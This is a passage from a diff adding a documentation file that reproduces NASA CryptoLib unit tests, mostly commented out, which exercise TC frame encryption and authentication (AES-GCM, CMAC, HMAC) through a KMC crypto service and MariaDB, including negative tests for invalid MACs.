+//     char* raw_tc_jpl_mmt_scid44_vcid1= "2003e408000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// // UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_ENC_AND_AUTH_AESGCM_8BYTE_MAC)
+// // {
+// //     // Setup & Initialize CryptoLib
+// //     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+// //                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+// //                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+// //                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+// //     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE,
+// "/certs/ammos-ca-bundle.crt", NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL);
+// //     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+// "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM", CLIENT_CERTIFICATE_KEY,
+// NULL, NULL);
+// //     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 57, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //     int32_t status = Crypto_Init();
+
+// //     char* enc_tc_jpl_mmt_scid44_vcid1= "2003E41E0000150000000000000000000000040001EF029857C5ED7E5B1807";
+// //     char* enc_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+// //     int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+// //     // Data=0001
+// //     // IV=000000000000000000000001
+// //     // AAD=00000000000000000000000000000000000000
+
+// //     TC_t* tc_processed_frame;
+// //     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+// //     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+// &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+// //     uint8_t* ptr_enc_frame = NULL;
+
+// //     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+// //     printf("Encrypted Frame Before Processing:\n");
+// //     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+// //     {
+// //         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+// //     }
+// //     printf("\n");
+
+// //     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+// &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+// //     if(status != CRYPTO_LIB_SUCCESS)
+// //     {
+// //         Crypto_Shutdown();
+// //     }
+// //     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// //     printf("Processed PDU:\n");
+// //     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+// //     {
+// //         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+// //     }
+// //     printf("\n");
+
+// //     ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+// //     ASSERT_EQ( 0x00,tc_processed_frame->tc_pdu[1]);
+
+// //     Crypto_Shutdown();
+// //     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+// //     free(ptr_enc_frame);
+// //     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// // }
+
+// // UTEST(KMC_CRYPTO, UNHAPPY_PATH_INVALID_MAC_PROCESS_SEC_ENC_AND_AUTH_AESGCM_8BYTE_MAC)
+// // {
+// //     // Setup & Initialize CryptoLib
+// //     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+// //                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+// //                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+// //                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+// //     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE,
+// "/certs/ammos-ca-bundle.crt", NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL);
+// //     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+// "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM", CLIENT_CERTIFICATE_KEY,
+// NULL, NULL);
+// //     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 11, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //     int32_t status = Crypto_Init();
+
+// //     char* enc_tc_jpl_mmt_scid44_vcid1= "20032C1E000009000000000000000000000001669C5639DCCDEA8C6CE3EEF2";
+// //     char* enc_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+// //     int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+// //     // Data=0001
+// //     // IV=000000000000000000000001
+// //     // AAD=00000000000000000000000000000000000000
+
+// //     TC_t* tc_processed_frame;
+// //     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+// //     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+// &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+// //     uint8_t* ptr_enc_frame = NULL;
+
+// //     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+// //     printf("Encrypted Frame Before Processing:\n");
+// //     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+// //     {
+// //         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+// //     }
+// //     printf("\n");
+
+// //     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+// &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+// //     if(status != CRYPTO_LIB_SUCCESS)
+// //     {
+// //         Crypto_Shutdown();
+// //     }
+// //     ASSERT_EQ(CRYPTOGRAHPY_KMC_CRYPTO_SERVICE_GENERIC_FAILURE, status);
+
+// //     Crypto_Shutdown();
+// //     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+// //     free(ptr_enc_frame);
+// // }
+
+// //16 bytes is max for AES GCM so this is an error test
+// // UTEST(KMC_CRYPTO, UNHAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_AESGCM_32BYTE_MAC)
+// // {
+// //     // Setup & Initialize CryptoLib
+// //     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+// //                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+// //                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+// //                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+// //     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE,
+// "/certs/ammos-ca-bundle.crt", NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL);
+// //     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+// "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM", CLIENT_CERTIFICATE_KEY,
+// NULL, NULL);
+// //     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 12, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //     int32_t status = Crypto_Init();
+
+// //     char* raw_tc_jpl_mmt_scid44_vcid1= "20033008000001bd37";
+// //     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+// //     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+// //     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+// &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+// //     uint8_t* ptr_enc_frame = NULL;
+// //     uint16_t enc_frame_len = 0;
+
+// //     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+// //     printf("Frame before encryption:\n");
+// //     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+// //     {
+// //         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+// //     }
+// //     printf("\n");
+
+// //     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+// raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len);
+// //     if(status != CRYPTO_LIB_SUCCESS)
+// //     {
+// //         Crypto_Shutdown();
+// //     }
+// //     // we expect an InvalidAlgorithmParameterException for macLength of that size.
+// //     ASSERT_EQ(CRYPTOGRAHPY_KMC_CRYPTO_SERVICE_GENERIC_FAILURE, status);
+
+// //     Crypto_Shutdown();
+// //     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+// //     free(ptr_enc_frame);
+// // }
+
+UTEST_MAIN();
+```
+
+### `ut_kmc_crypto_auth_only.c`
+
+**경로:** `components/cryptolib/test/kmc/ut_kmc_crypto_auth_only.c`
+
+
+```c
+/* Copyright (C) 2009 - 2022 National Aeronautics and Space Administration.
+   All Foreign Rights are Reserved to the U.S. Government.
+
+   This software is provided "as is" without any warranty of any kind, either expressed, implied, or statutory,
+   including, but not limited to, any warranty that the software will conform to specifications, any implied warranties
+   of merchantability, fitness for a particular purpose, and freedom from infringement, and any warranty that the
+   documentation will conform to the program, or any warranty that the software will be error free.
+
+   In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or
+   consequential damages, arising out of, resulting from, or in any way connected with the software or its
+   documentation, whether or not based upon warranty, contract, tort or otherwise, and whether or not loss was sustained
+   from, or arose out of the results of, or use of, the software, documentation or services provided hereunder.
+
+   ITC Team
+   NASA IV&V
+   jstar-development-team@mail.nasa.gov
+*/
+
+/**
+ *  Unit Tests that make use of TC_ApplySecurity/TC_ProcessSecurity function on the data with KMC Crypto Service/MariaDB
+ *Functionality Enabled.
+ **/
+#include "crypto.h"
+#include "crypto_error.h"
+#include "sa_interface.h"
+#include "utest.h"
+
+#include "crypto.h"
+#include "shared_util.h"
+#include <stdio.h>
+#include <mysql/mysql.h>
+
+// #ifdef KMC_MDB_RH
+//     #define CLIENT_CERTIFICATE "/certs/redhat-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/redhat-key.pem"
+// #else
+//     /* KMC_MDB_DB */
+//     #define CLIENT_CERTIFICATE "/certs/debian-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/debian-key.pem"
+// #endif
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_CMAC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 7, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c1c08000001bb40";
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  * This doesn't work -- Apply Security Auth Only doesn't return the proper tag.
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_CMAC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 7, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     // char* enc_tc_jpl_mmt_scid44_vcid1= "202C1C1A0000050001C50827915AEB423F054402D5DC3C67566986"; // Returns
+//     CRYPTO_LIB_ERR_INVALID_HEADER since SN/ARC missing from header
+//     // char* enc_tc_jpl_mmt_scid44_vcid1= "202C1C1E000005000000050001C7BA93010000000000000000000000007ACC";  //
+//     Invalid MAC, should fail with error 510 char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "202C1C1E00000B0000000300018090C73F5D6A53ACEAFA86EB1DF66ED92F46"; char* enc_tc_jpl_mmt_scid44_vcid1_expect =
+//     NULL; int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_CMAC_LARGE_FRM_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 7, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1=
+//     "202c1f0700a6ec42999902579daaac3a5af6aabe93288e18d5d4046e24cc5df1f8fa06bac515206d5b0dfcc9861db694f3207175b725bfa6e987fadc1e1e417bff0c30a90b143ca737f2fcf02525c6080c38fde4d4da229387339f363ccdabf42a1defa29f711926c8e0a7479e082ec00b495ae53c8e33b5dc001833aa1d909b4b3aecd60bc6b0af62e8febb58fa15979a5d1e37b9ba48d6d1bf4b9d669306375d7f93942908e410492d6535c91245abbb98a0584aa764815bfdcab44d8c0aeff3a2e2c712649497f95e9440bb1b562cb6fa70a5ff5e5fdbcad40a97fa3bf48f0560bc9c7125b758f25a27678996e5ee3a82a5b864672b80888c2d469fe690aca0501d0de3bec247825f3fbd7f51184f8099dd2ffeb140c9aad86ae8ade912eadbcbef0bb821e684366a084f8d65bd9d0acccfae5fb130d8bf27ff855cea8de4a4e249e5bc8ef9732c06d6d578574b9f936ae1837a61369a7871612337df2dc091dadc8386e53aba816f3a162b71c268e07583a0378805a1f435bf437c0e27193cee4b653273d965fc0b42cfd3c094e2ff89f276153d452814ff016bfcc1b5ec313667de1aaddeb2d31dcaa75f88e4ac758556c7a632374089c53852601385c89aa668b70fd735e9053473538614408241ac47f6ef12aff10c2bce36df6afe7610a5a06997680b579953888684543b7cdefc7cc5987459a9255d187c8790284ad1f2ca38a3a3d56d909a03af87f3788e00d1b9887296ea5ff4087306569c2a3581189a70892e01279812151fdb9f8ec71786edd9cddd8652558503aac1904cf542aeebf269b08c5f648145b498be842080ccbdfe14c8cad1f371e706c0c4ed27d963e2e645224510e7d43ddf50daf8225f484ec841c9e642e489bd70fdbc925c532ab988d0f3999e3e1bdc88d5b0dd61e2b8d72a4a994f3efdc19382cdffdb96ea55ee5a389b003fc91ebc493c0949f56dc7b4b6d69d10dbc937f3757fb36b9000bf67d049c9c768a586b14b5166bffb41fc29c1d5613f2aaa2868fd974a95a3461b0c1c0f1ca87eccf7624fd1ffbe2f45463505b649a0b32410182731dfbe23813e88c3b6bdec7e";
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_HMAC256_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 8, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c2008000001bb40";
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  * This doesn't work -- Apply Security Auth Only doesn't return the proper tag.
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_HMAC256_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
